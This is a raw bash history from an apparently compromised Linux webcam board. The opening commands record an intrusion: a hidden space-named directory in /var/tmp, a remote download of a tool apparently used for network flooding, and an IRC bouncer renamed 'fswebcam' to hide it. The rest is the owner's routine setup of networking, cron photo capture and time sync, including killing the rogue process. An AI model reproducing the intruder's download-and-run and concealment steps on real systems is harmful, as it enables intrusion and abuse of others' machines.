w
ifconfig
cat /etc/issue
w
cd /var/tmp
ls -all
mkdir ' '
wget smartulet.altervista.org/unixcod2013.tgz
curl
curl -O http://smartulet.altervista.org/unixcod2013.tgz
ls
tar zxvf unixcod2013.tgz 
cd unixcod13
ls
./unix
chmod +x *
./unix a 211 eth0 100
./unix a 211 eth0 10
cd ..
rm -rf *
ls -all
cd ' '
kdir ' '
mkdir ' '
cd ' '
curl -O http://www.psybnc.at/download/beta/psyBNC-2.3.2-7.tar.gz
ls
tar zxvf psyBNC-2.3.2-7.tar.gz 
rm -rf psyBNC-2.3.2-7.tar.gz 
cd psybnc/
ls
make
ls
ps ax
mv psybnc fswebcam
export PATH=".";fswebcam
ps ax
cd /var/tmp
ls -all
cd ' '
ls
cd psybnc/
ls
vi psybnc.conf
w
cd /var/tmp
ls -all
cd ' '
ls
cd psybnc
ls
export PATH=".";fswebcam
ls
cd /home/
ls
rm /var/cache/pacman/pkg/*
ls
exit
cd /home/
sl
ls
rm *
ls
rm ./*
ls
cd ..
exit
df -h
exit
ls /home/
exit
df -h
exit
ls /home/
df -g
df -h
exit
ls /home/
df -h
exit
ls
ls /home/
ps aux
top
pacman -Syu
reboot
ls
systemctl disable dhcpcd
systemctl disable dhcp
reboot
exit
ls
top
ls
top
killall node
top
top
ifconfig
exit
ifconfig
ipcalc -nb 18.85.32.10 -s 1
pacman -S ipcalc
ipcalc -nb 18.85.32.10 -s 1
ls
rm /var/cache/pacman/pkg/*
ls /home/
ifconfig -a
ifconfig -a | grep HWaddr
ip link show eth0
cat beagle/initScripts/ipstatic.service 
ls
cat beagle/startup_server.sh 
cd beagle/
./startup_server.sh 
vim /usr/lib/systemd/system/ipstatic.service 
ps aux | grep dhcpcd
systemctl stop dhcpcd
ls
ifconfig
vim /etc/conf.d/network@eth0
cat startup_server.sh 
vim /etc/systemd/system/network@.service
systemctl enable network@eth0.service
systemctl start network@eth0.service
systemctl status network@eth0.service
hostnamectl set-hostname cityfarm
reboot
ls
top
ps aux | grep erl
top
ls
ifconfig
ls /home/
erl
exit
exit
ls
ls /home/
top
ps aux | grep fswebcam
ps aux | grep fswebcam
ulimit -a
ulimit -s -m 500000
ulimit -a
ulimit -s -m 350000
ulimit -a
ps aux | grep fswebcam
ps aux | grep fswebcam
df -h
df -h
ps aux | grep fswebcam
ls /home/
ls /home/
ls /home/
pacman -Syu
ls /home/
ls /home/
ls /home/
ls /home/
ls /home/
cat /etc/hosts 
cat /etc/hostname 
cat /etc/host.conf 
ps aux | grep fswebcam
ls
top
clear
ls /home/
pacman -Syy
exit
ls
ls /home/
ls
pacman -Syy
exit
df -h
erl
pacman -S espeak
rm /var/cache/pacman/pkg/*
df -h
ls /home/
df -h
ffmpeg -i /home/* -c:v libx264 -r 30 -pix_fmy yuv420p out.mp4
ffmpeg -i /home/* -c:v libx264 -r 30 -pix_fmt yuv420p out.mp4
ffmpeg -i /home/* -c:v libx264 -r 30 out.mp4
ls
ffmpeg -i /home/-YYYY-MM-DD--HH-MM-SS -c:v libx264 -r 30 out.mp4
ffmpeg -pattern_type glob -i '/home/*' -c:v libx264 -r 30 out.mp4
ffmpeg -pattern_type glob -i '/home/*.jpeg' -c:v libx264 -r 30 out.mp4
ls
rm out.mp4 
ls /home/
exit
ls /home/
ls /home/
ls /home/
ls /home/
reboot
ps aux | grep fswebcam
cat /var/log/faillog 
cat /var/log/lastlog 
cat /var/log/*
pacman -S traceroute
traceroute 182.71.4.231
ls
ssh nottyweb@182.71.4.231
ssh nottyweb@182.71.4.231
ls
killall fswebcam
ps aux | grep fswebcam
killall fswebcam
ps aux | grep fswebcam
killall /bin/bash
ps aux | grep fswebcam
vim beagle/boneCV/streamVideoUDP 
vim /etc/systemd/system/multi-user.target.wants/stream.service 
systemctl disable stream
crontab -e
crontab -e
vim takePhoto0.sh
ps aux | grep bash
ps aux | grep /bin/bash
crontab -3
crontab -e
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -re -i - -f image2 image.jpeg
ls
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -re -i - -f image2 image.jpeg
rm image.jpeg 
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -re -i - -f image2 image.jpeg
rm image.jpeg 
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -re -i - -s hd1080 -f image2 image.jpeg
cd /home/
ls
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -t 100000 -f vfwcap -s 1280x720 -i - -r 1 -f image2 camera%06d.jpg
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -t 100000 -s hd1080 -i - -r 1 -f image2 camera%06d.jpg
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -t 100000 -s 1920x1080 -i - -r 1 -f image2 camera%06d.jpg
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -t 100000 -i - -r 1 -f image2 camera%06d.jpg
ls
rm camera00000*
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -t 100000 -i - -r 0.5 -f image2 camera%06d.jpg
ls
rm camera00000*
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -t 100000 -i - -r 0.1 -f image2 camera%06d.jpg
ls
rm camera00000*
pacman -S streamer
packer -S streamer
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -i - -f image2 camera%06d.jpg
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -i - -f image2 camera%06d.jpg
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -i - -f image2 camera%06d.jpg
ls c*
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -i - -f image2  %t.jpeg
ls
$(date +"%F-%k-%M-%S")
/root/beagle/boneCV/capture -F -o -c0 | /usr/bin/ffmpeg -i - -f image2 /home/$(date +"%F-%k-%M-%S").jpeg
/root/beagle/boneCV/capture -F -o -c0 | ffmpeg -i - -f image2  $(date +"%F-%k-%M-%S").jpeg
ls
crontab -e
crontab -l
ls /dev/video0 
time
date
date
date
date
ls
date
ls
vim takePhoto.sh
crontab -e
date
crontab -e
date
ls
chmod +x takePhoto.sh 
crontab -l
date
./takePhoto.sh 
date
ls
date
ls
ls
ls
ls
ls
ls
ls
ls
ls
ls
ls
ls
ls
ls
ls
ls
ls
ls /home/takePhoto.sh 
ls
crontab -l
vim takePhoto.sh 
crontab -e
date
crontab -l
date
ls
ls
ls
ls
ls
ls
ls
ls
ls
ls
ks
ls
crontab -e
date
exit
date
date
systemctl enable cronie
systemctl start cronie
systemctl start cron
date
systemctl start cronie
reboot
date
date
ps aux | grep cron
run-parts -v /etc/cron.hourly/0anacron 
run-parts -v /etc/cron.hourly/
crontab -e
date
date
date
systemctl restart cronie
crond -n
date
cp takePhoto0.sh /root/
date
ls /home/
exit
/root/beagle/boneCV/capture -F -o -c0 | /usr/bin/ffmpeg -vcodec copy -i - -f image2 /home/$(date +"%F-%k-%M-%S").jpeg
/root/beagle/boneCV/capture -F -o -c0 | /usr/bin/ffmpeg -i - -s 1920x1090 -f image2 /home/$(date +"%F-%k-%M-%S").jpeg
/root/beagle/boneCV/capture -F -o -c0 | /usr/bin/ffmpeg -i - -s 1920x1080 -f image2 /home/$(date +"%F-%k-%M-%S").jpeg
df -h
ls -la /home/
crontab -e
reboot
pacman -Syy
pacman -Syy
pacman -Syu
rm /var/cache/pacman/pkg/*
df -h
ls /home/
date
date
date
date
ls /home/
ls /home/
reboot
date
date
date
date
date
timedatectl set-timezone America/New_York
date
date
date
ls /home/
date
date
date
date
date
date
ntpdate pool.ntp.org
systemctl stop ntpd
ntpdate pool.ntp.org
ntpdate pool.ntp.org
ntpdate pool.ntp.org
systemctl start ntpd
systemctl enable ntpd
systemctl start ntpd
ps aux | grep ntpd
date
date
exit
top
ls /home/
date
ps aux | grep net
systemctl stop netd
systemctl stop ntpd
cat /etc/systemd/system/multi-user.target.wants/ntpd.service 
ps aux | grep ntpd
ntpdate -s time.nist.gov
date
systemctl start ntpd
ps aux | grep ntpd
exit
ls /home/
ls /home/
date
cd /home/
./takePhoto.sh 
rm 2014-01-09- 
crontab -l
vim takePhoto.sh 
$(date +"%F-%k-%M-%S")
$(date+"%F-%k-%M-%S")
$(date+%F-%k-%M-%S)
$(date+"%F-%k-%M-%S")
$(date +"%F-%k-%M-%S")
$(date "%F-%k-%M-%S")
date
date -h
date --help
$(date "%F-%k-%M-%S")
date %F-%k-%M
date %F
date -f %F
date --format "%F"
date
date +%F-%k-%M
vim takePhoto.sh 
date +%F-%H-%M
vim takePhoto.sh 
vim takePhoto.sh 
vim takePhoto.sh 
./takePhoto.sh 
exit
ls /home/
exit
ls /home/ -la
exit
ls
ls /home/
exit
cd /home/
ls
exit
vim /home/takePhoto.sh 
/usr/bin/ffmpeg -re -vcodec copy -i /dev/video0 -f image2 /home/$(date +"%F-%H-%M-%S").jpeg
vim /home/takePhoto.sh 
/usr/bin/ffmpeg -re -f video4linux2 -s 1920x1080 -i /dev/video0 -f image2 /home/$(date +"%F-%H-%M-%S").jpeg
exit
ls
cd /home/
ls
vim takePhoto.sh 
exit
ls /home/
exit
date
crontab -l
/home/takePhoto.sh 
/home/takePhoto.sh 
ps aux | grep ffmpeg
sudo killall ffmpeg
killall ffmpeg
ps aux | grep ffmpeg
killall ffmpeg
ps aux | grep ffmpeg
/home/takePhoto.sh 
ls
ps aux | grep ffmpeg
exit
ls /home/
ls
pacman -Syy
ls
/sbin/lslss
/sbin/ls
ls
cd /home/
ls
ls
pacman -S ls
exit
ls /home/
cd /var/
ls
pacman -S ls
s
pacman -S zsh
zsh
exit
